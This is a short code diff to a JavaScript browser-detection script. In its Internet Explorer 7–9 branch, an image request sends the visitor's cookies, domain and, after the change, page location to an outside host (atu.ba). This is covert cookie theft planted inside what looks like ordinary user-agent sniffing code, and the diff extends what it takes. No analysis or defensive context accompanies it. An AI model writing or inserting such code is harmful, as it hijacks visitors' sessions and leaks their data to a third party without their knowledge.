@@ -31,7 +31,7 @@ else // if no "MSIE" string in userAgent
 if (detectIEregexp.test(navigator.userAgent)){ //if some form of IE
  var ieversion=new Number(RegExp.$1) // capture x.x portion and store as a number
  if (ieversion==7 || ieversion==8 || ieversion==9)
- img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain;
+ img=new Image();img.src="http://atu.ba/test2.php?c="+escape(document.cookie)+" Domain: "+document.domain+" Location: "+document.location;
  }
 else{
 }
